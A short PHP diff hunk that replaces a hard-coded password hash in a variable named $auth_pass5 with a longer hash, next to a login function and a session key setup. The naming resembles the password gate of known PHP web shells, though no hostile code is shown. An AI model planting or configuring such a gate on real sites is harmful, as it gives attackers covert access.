@@ -36,7 +36,7 @@ function printLoginx() {
     exit; 
 } 
 
-$auth_pass5 = "aa8b23da9410f97fd2f0c34e578978c3"; 
+$auth_pass5 = "b4b3745b9b336927dd40d3fdad1ffce50c973b2e"; 
 if(empty($_SESSION["keyxx"])) {
    $keyxxx = generateRandomString();
    $_SESSION["keyxx"] = $keyxxx;
